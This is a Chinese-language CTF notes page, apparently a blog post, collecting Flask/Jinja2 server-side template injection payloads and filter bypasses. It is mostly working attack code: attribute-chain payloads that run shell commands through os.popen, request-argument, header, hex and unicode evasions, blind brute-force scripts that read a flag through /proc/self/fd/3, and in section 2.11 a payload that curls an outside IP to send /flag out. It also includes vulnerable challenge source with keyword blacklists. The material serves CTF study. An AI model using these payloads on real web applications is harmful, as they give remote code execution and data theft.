
<p>利用request的思路去重新把payload拼出来</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()</span><br></pre></td></tr></table></figure>



<h2 id="2-4将中括号和-号都过滤情况下"><a href="#2-4将中括号和-号都过滤情况下" class="headerlink" title="2.4将中括号和.号都过滤情况下"></a>2.4将中括号和.号都过滤情况下</h2><p>当然上面的难度都是相当简单的题目才会遇见了，在当前环境下，往往会过滤的相当严格，我们应该从flask本身出现的类开始找，比如题目可能验证的时候，仅仅验证我们输入的id。但是我们可以利用此，让flask读取header中的内容，这样就可以打破限制</p>
<p>我们可以先写一个脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;</span>) &#125;&#125;       </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>之后为了绕过括号的限制，采用这种方法：</p>
<p>这里给出一个payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c|attr(request.headers.x4)==request.headers.x5 %&#125;</span><br><span class="line">    &#123;%<span class="keyword">for</span> d <span class="keyword">in</span> ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125;</span><br><span class="line">        &#123;%<span class="keyword">if</span> d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif%&#125;</span><br><span class="line">&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">x13: </span><br><span class="line">x9: <span class="built_in">eval</span></span><br><span class="line">x8: __builtins__</span><br><span class="line">x7: __globals__</span><br><span class="line">x6: __init__</span><br><span class="line">x5: catch_warnings</span><br><span class="line">x4: __name__</span><br><span class="line">x3: __subclasses__</span><br><span class="line">x2: __base__</span><br><span class="line">x1: __class__</span><br></pre></td></tr></table></figure>

<h2 id="2-6-过滤了单引号和双引号的情况"><a href="#2-6-过滤了单引号和双引号的情况" class="headerlink" title="2.6 过滤了单引号和双引号的情况"></a>2.6 过滤了单引号和双引号的情况</h2><p>在这种情况下，我们就只能去尝试查找各类的open函数了，没有办法执行命令了，于是查找到：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()</span><br></pre></td></tr></table></figure>

<p>之后为了绕过引号的过滤，我们尝试使用request.args.x1的方式进行绕过</p>
<p>拼凑得：</p>
<h2 id="2-7-读取文件"><a href="#2-7-读取文件" class="headerlink" title="2.7 读取文件"></a>2.7 读取文件</h2><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag</span><br></pre></td></tr></table></figure>

<p>而实际上，我发现中括号也是可以进行替代的</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;)    &#125;&#125;&amp;x1=eval</span><br></pre></td></tr></table></figure>

<p>拼凑得出：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir</span><br></pre></td></tr></table></figure>



<h2 id="2-8过滤了eval，popen，两个左花括号"><a href="#2-8过滤了eval，popen，两个左花括号" class="headerlink" title="2.8过滤了eval，popen，两个左花括号"></a>2.8过滤了eval，popen，两个左花括号</h2><p>这里记录一下自己学习到的一道题目：</p>
<h3 id="上海市网络安全大赛："><a href="#上海市网络安全大赛：" class="headerlink" title="上海市网络安全大赛："></a>上海市网络安全大赛：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span>__</span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    <span class="built_in">help</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /flag&#x27;</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    r = request.path</span><br><span class="line">    r = request.data.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p>这道题比较新有意思的点在两个地方：</p>
<p>过滤了这个地方：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br></pre></td></tr></table></figure>

<p>过滤了{ {} },这样子的情况以前自己没有遇过，后来知道可以进行盲注，并且我们可以尝试读取文件，读取文件的payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>如果满足条件，则会输出<del>p0</del>，否则就不会输出。第二点，我们该读取什么文件呢？</p>
<p>这里运用了os.system(“rm -f /flag”)</p>
<p>默认的进程删除后会存放在暂时文件中，进程为：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>

<p>故编写脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.post(url, data=payload,headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;~p0~&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sa=string.printable</span><br><span class="line"><span class="comment">#print(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sa:</span><br><span class="line">        payload=<span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i + <span class="number">1</span>) + <span class="string">&#x27;] == &quot;&#x27;</span> + c + <span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>

<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters + string.digits+ <span class="string">&quot;-/_&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+j+<span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data =&#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.get(url,params=data).text</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;~p0~&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">            flag+=j</span><br><span class="line">            print(<span class="string">&quot;flag:&quot;</span> + flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>还有一个：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(<span class="number">233</span>)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)&#125;&#125;&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=<span class="built_in">eval</span>&amp;x9=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;cat flag.txt&quot;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="2-8过滤了空格，requests"><a href="#2-8过滤了空格，requests" class="headerlink" title="2.8过滤了空格，requests"></a>2.8过滤了空格，requests</h2><p>payload基本没有变动，在这种情况下还被恶心了一下request，所以我们应该这样用：</p>
<p>原本正常的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1&#x3D;flag</span><br></pre></td></tr></table></figure>

<p>改造后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;cat\x20&#x2F;flag&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-9利用-直接读取文件"><a href="#2-9利用-直接读取文件" class="headerlink" title="2.9利用{   %直接读取文件"></a>2.9利用{   %直接读取文件</h2><p>以前一直以为 是不能直接读取文件的，后面才发现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(config)%&#125;</span><br></pre></td></tr></table></figure>

<p>这样就可以正常的输出语句</p>
<p>将下面这些：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(a|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;eval&quot;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>

<p>第二种：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(config|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;eval&quot;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>

<p>如果比赛环境中包含回显，其实也可以利用这么一个思路,查找catch_warnings：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print(([]|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)())[169].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) )%&#125;</span><br></pre></td></tr></table></figure>

<p>hgame遇见的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(config|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;eval&quot;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[1:]&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>



<p>挨个十六进制</p>
<p>附上一个转十六进制的小脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;__globals__&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(h)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a :</span><br><span class="line">    i = <span class="built_in">bytes</span>(i,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    i = binascii.b2a_hex(i)</span><br><span class="line">    i = i.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    i = <span class="built_in">str</span>(i)</span><br><span class="line">    i = i.replace(i,<span class="string">&quot;\\x&quot;</span>+i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># i = i.replace(i,&quot;\\x&quot;+i)</span></span><br><span class="line">    print(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># print(h)</span></span><br></pre></td></tr></table></figure>



<p>在华为比赛中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_msg</span>(<span class="params">msg</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;json&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#123;&#123;&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> msg: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/over&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;over.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/success&quot;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span>():</span></span><br><span class="line">    msg = request.args.get(<span class="string">&quot;msg&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(msg == <span class="literal">None</span>):</span><br><span class="line">        msg = <span class="string">&#x27;anonymous&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> safe_msg(msg):</span><br><span class="line">        t = Template(<span class="string">&quot;Good Job! &quot;</span> + msg + <span class="string">&quot; . But sorry, there isn&#x27;t flag&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">&quot;You look dangerous.....&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render(request=request)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br><span class="line"> . But sorry, there isn<span class="string">&#x27;t flag</span></span><br></pre></td></tr></table></figure>

<p>可以用十六进制绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(a|attr(<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x67\x65\x74&quot;</span>)(<span class="string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x67\x65\x74&quot;</span>)(<span class="string">&quot;\x65\x76\x61\x6c&quot;</span>)(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x70\x6f\x70\x65\x6e\x28\x22\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x22\x29\x2e\x72\x65\x61\x64\x28\x29&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>



<p>除了十六进制，还有unicode可以进行绕过：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%print(a|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u0067\u0065\u0074&quot;</span>)(<span class="string">&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u0067\u0065\u0074&quot;</span>)(<span class="string">&quot;\u0065\u0076\u0061\u006c&quot;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>))%&#125;</span><br></pre></td></tr></table></figure>





<h2 id="2-10-格式化字符串新思路"><a href="#2-10-格式化字符串新思路" class="headerlink" title="2.10 格式化字符串新思路"></a>2.10 格式化字符串新思路</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product</span>(<span class="params">poc</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">chr</span> <span class="keyword">in</span> poc:</span><br><span class="line">        model = <span class="string">&quot;&#x27;&#123;0:c&#125;&#x27;[&#x27;format&#x27;](%d)&quot;</span> % <span class="built_in">ord</span>(<span class="built_in">chr</span>)</span><br><span class="line">        payload += model + <span class="string">&#x27;+&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = product(<span class="string">&#x27;__builtins__&#x27;</span>).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&quot;%2b&quot;</span>)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[65].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">payload</span>):</span></span><br><span class="line">    res = re.findall(<span class="string">&quot;\(\d+\)&quot;</span>, payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        print(<span class="built_in">chr</span>(<span class="built_in">int</span>(i[<span class="number">1</span>:<span class="number">-1</span>])), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decode(a)</span><br></pre></td></tr></table></figure>

<p><a href="https://xz.aliyun.com/t/7535">文章出处</a></p>
<h2 id="2-11-过滤了flag"><a href="#2-11-过滤了flag" class="headerlink" title="2.11 过滤了flag"></a>2.11 过滤了flag</h2><p>反弹shell出去：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">()|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(233)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&quot;eval&quot;)(&quot;getattr(__import__(&#39;os&#39;),&#39;system&#39;)(&#39;curl http:&#x2F;&#x2F;123.57.240.205:1234&#x2F;?a&#x3D;&#96;cat &#x2F;flag&#96;&#39;)&quot;)</span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a  =lipsum|lower|<span class="built_in">list</span>|random%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a,item=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(bui=a,ltins=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ch=<span class="built_in">dict</span>(c=a,hr=b)|join %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=  (x|attr(geti))(ch) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(lipsum|attr(glo)).get(built) %&#125;</span><br></pre></td></tr></table></figure>

